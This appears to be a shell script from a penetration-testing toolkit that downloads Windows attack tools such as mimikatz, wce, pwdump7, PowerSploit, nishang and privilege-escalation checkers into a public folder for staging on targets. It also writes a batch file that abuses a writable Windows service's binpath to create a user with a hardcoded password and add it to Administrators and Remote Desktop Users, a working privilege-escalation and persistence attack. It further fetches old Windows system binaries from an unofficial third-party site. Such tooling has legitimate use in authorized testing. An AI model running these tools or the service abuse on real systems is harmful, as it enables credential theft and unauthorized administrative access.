mkdir -p public/tools_windows
cd public/tools_windows
  banner "shared_windows - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite"
  wget -N https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASbat/winPEAS.bat
  wget -N https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe
  mv winPEAS.exe winPEAS-64.exe
  wget -N https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/x86/Release/winPEAS.exe
  mv winPEAS.exe winPEAS-86.exe

  banner "shared_windows - copy mimikatz"
  cp ../../tools_windows/mimikatz/Win32/mimikatz.exe mimikatz.exe 
  cp ../../tools_windows/mimikatz/Win32/mimilove.exe mimilove.exe 
  cp ../../tools_windows/mimikatz/x64/mimikatz.exe mimikatz64.exe 

  # TODO BUILD Watson
  #wget https://github.com/rasta-mouse/Watson/releases/download/2.0/Watson_Net35.exe
  #wget https://github.com/rasta-mouse/Watson/releases/download/2.0/Watson_Net45.exe

  # TODO BUILD
  # https://github.com/cobbr/SharpSploit + https://github.com/anthemtotheego/SharpSploitConsole
  # https://github.com/anthemtotheego/SharpExec.git

  # TODO Build -  Exec in memory
  # https://github.com/anthemtotheego/SharpCradle.git

  # TODO build - similar to responder
  #https://github.com/Kevin-Robertson/InveighZero

  # TODO - PyINstaller on examples
  banner "shared_windows - https://github.com/SecureAuthCorp/impacket.git"
  git clone --depth=1 --recursive https://github.com/SecureAuthCorp/impacket.git

  banner "shared_windows - https://github.com/Kevin-Robertson/Invoke-TheHash.git"
  git clone --depth=1 --recursive https://github.com/Kevin-Robertson/Invoke-TheHash.git

  banner "shared_windows - accesschk-2003-xp - https://github.com/ankh2054/windows-pentest/tree/master/Privelege"
  wget -N https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe

  banner "shared_windows - accesschk-2008-vista.exe - https://github.com/ankh2054/windows-pentest/tree/master/Privelege"
  wget -N https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2008-vista.exe

  if [ ! -f accesschk.exe ]; then
    banner "shared_windows - accesschk.exe - https://download.sysinternals.com/files/AccessChk.zip"
    wget https://download.sysinternals.com/files/AccessChk.zip
    unzip AccessChk.zip
    rm Eula.txt
    rm AccessChk.zip
  fi

  if [ ! -d pstools ]; then
    banner "shared_windows - PSTools - https://download.sysinternals.com/files/PSTools.zip"
    wget https://download.sysinternals.com/files/PSTools.zip
    unzip PSTools.zip -d pstools
    rm PSTools.zip
  fi

  if [ ! -f wce.exe ]; then
    banner "shared_windows - wce - https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip"
    wget https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip
    unzip wce_v1_41beta_universal.zip -d wce
    cp wce/wce.exe .
    rm -rf wce
    rm wce_v1_41beta_universal.zip
  fi

  if [ ! -f tcpdump.exe ]; then
    banner "shared_windows - tcpdump - http://www.microolap.com/downloads/tcpdump/tcpdump_trial_license.zip"
    wget http://www.microolap.com/downloads/tcpdump/tcpdump_trial_license.zip
    unzip tcpdump_trial_license.zip -d tcpdumpwim
    cp tcpdumpwim/tcpdump.exe .
    rm -rf tcpdumpwim
    rm tcpdump_trial_license.zip
  fi

  if [ ! -f gp3finder.exe ]; then
    banner "shared_windows - gp3finder_v4.0 - http://www.sec-1.com/blog/wp-content/uploads/2015/05/gp3finder_v4.0.zip"
    wget http://www.sec-1.com/blog/wp-content/uploads/2015/05/gp3finder_v4.0.zip
    unzip gp3finder_v4.0.zip
    rm gp3finder_v4.0.zip
  fi

  #TODO Installation
  banner "shared_windows - WiresharkPortable_3.2.0 - https://2.na.dl.wireshark.org/win32/WiresharkPortable_3.2.0.paf.exe"
  wget -N https://2.na.dl.wireshark.org/win32/WiresharkPortable_3.2.0.paf.exe

  if [ ! -d 3proxy ]; then
    banner "shared_windows - "
    wget https://github.com/z3APA3A/3proxy/releases/download/0.8.13/3proxy-0.8.13.zip
    unzip 3proxy-0.8.13.zip -d 3proxy
    mv 3proxy-0.8.13.zip 3proxy.zip
  fi

  if [ ! -d pwdump7 ]; then
    banner "shared_windows - "
    wget http://www.tarasco.org/security/pwdump_7/pwdump7.zip
    unzip pwdump7.zip -d pwdump7
    rm pwdump7.zip
  fi

  banner "shared_windows - "
  wget -N https://github.com/pentestmonkey/windows-privesc-check/raw/master/windows-privesc-check2.exe

  if [ ! -d sysi ]; then
    banner "shared_windows - "
    wget https://download.sysinternals.com/files/SysinternalsSuite.zip
    unzip SysinternalsSuite.zip -d sysi
    rm SysinternalsSuite.zip
  fi

  banner "shared_windows - https://github.com/rasta-mouse/Sherlock.git"
  wget -N https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1

  banner "shared_windows - https://github.com/PowerShellMafia/PowerSploit.git"
  git clone --depth=1 --recursive https://github.com/PowerShellMafia/PowerSploit.git

  banner "shared_windows - https://github.com/samratashok/nishang.git"
  git clone --depth=1 --recursive https://github.com/samratashok/nishang.git

  banner "shared_windows - https://github.com/411Hall/JAWS.git"
  git clone --depth=1 --recursive https://github.com/411Hall/JAWS.git

  banner "shared_windows - https://github.com/Arvanaghi/SessionGopher.git"
  git clone --depth=1 --recursive https://github.com/Arvanaghi/SessionGopher.git

  banner "shared_windows - https://github.com/enjoiz/Privesc.git"
  git clone --depth=1 --recursive https://github.com/enjoiz/Privesc.git

  banner "shared_windows - https://github.com/AlessandroZ/BeRoot.git"
  git clone --depth=1 --recursive https://github.com/AlessandroZ/BeRoot.git

  banner "shared_windows - https://github.com/Kevin-Robertson/Powermad.git"
  git clone --depth=1 --recursive https://github.com/Kevin-Robertson/Powermad.git

banner "shared_windows - service_abuse_create_user.bat"
cat <<\EOT >service_abuse_create_user.bat
  sc config WebDriveService binpath= "net user /add amxuser1 amxpass1234"
  sc config WebDriveService obj= ".\LocalSystem" password= ""
  sc qc WebDriveService
  net stop WebDriveService
  net start WebDriveService
  net start WebDriveService

  sc config WebDriveService binpath= "net localgroup administrators amxuser1 /add"
  sc config WebDriveService obj= ".\LocalSystem" password= ""
  sc qc WebDriveService
  net stop WebDriveService
  net start WebDriveService
  net start WebDriveService

  sc config WebDriveService binpath= "net localgroup \"Remote Desktop Users\" amxuser1 /add"
  sc config WebDriveService obj= ".\LocalSystem" password= ""
  sc qc WebDriveService
  net stop WebDriveService
  net start WebDriveService
  net start WebDriveService
EOT

cd -

rm -rf public/tools_windows/bin
mkdir -p public/tools_windows/bin
cd public/tools_windows/bin

  banner "shared_windows - copying /usr/share/windows-binaries/* to bin"
  cp -rf /usr/share/windows-binaries/* .

  banner "shared_windows - downloading binaries from saule-spb.ru"
  # http://www.saule-spb.ru/touch/windows_files.html
  wget http://www.saule-spb.ru/windows/reg.zip
  wget http://www.saule-spb.ru/windows/regedit.zip
  wget http://www.saule-spb.ru/windows/regini.zip
  wget http://www.saule-spb.ru/windows/sclist.zip
  unzip sclist.zip
  mv sclist/sclist.exe sclist.exe
  rm -rf sclist
  rm sclist.zip
  
  wget http://www.saule-spb.ru/windows/tasklist.zip
  wget http://www.saule-spb.ru/windows/taskkill.rar
  wget http://www.saule-spb.ru/windows/netstat.zip
  wget http://www.saule-spb.ru/windows/ip6fw.zip
  
  wget http://www.saule-spb.ru/windows/tcpip-2892.zip
  unzip tcpip-2892.zip
  mv tcpip.sys tcpip-2892.sys
  rm tcpip-2892.zip
  
  wget http://www.saule-spb.ru/windows/tcpip-2180.zip
  unzip tcpip-2180.zip
  mv tcpip.sys tcpip-2180.sys
  rm tcpip-2180.zip
  
  wget http://www.saule-spb.ru/windows/sfc_os_dll_5.1.2600.1106.rar
  wget http://www.saule-spb.ru/windows/sfc_os_dll_5.1.2600.2180.rar
  wget http://www.saule-spb.ru/windows/sfc_os_dll_5.2.3790.3959.rar
  
  # Run a DLL as an App
  wget http://www.saule-spb.ru/windows/rundll32_xp2.zip
  unzip rundll32_xp2.zip
  mv rundll32_xp2/rundll32.exe rundll32_xp2.exe
  rm -rf rundll32_xp2
  rm rundll32_xp2.zip
  
  wget http://www.saule-spb.ru/windows/rundll32_2003.zip
  unzip rundll32_2003.zip
  mv rundll32.exe rundll32_2003.exe
  rm rundll32_2003.zip
  
  # Windows Control Panel
  wget http://www.saule-spb.ru/windows/control_2003.zip
  
  # System Configuration Utility
  wget http://www.saule-spb.ru/windows/msconfig_xp2.zip
  unzip msconfig_xp2.zip
  mv msconfig.exe msconfig_xp2.exe
  rm msconfig_xp2.zip

  wget http://www.saule-spb.ru/windows/msconfig_2003.zip
  unzip msconfig_2003.zip
  mv msconfig.exe msconfig_2003.exe
  rm msconfig_2003.zip
  
  for i in *.zip; do unzip $i; done
  for i in *.rar; do unrar x $i; done
  rm *.zip *.rar

cd -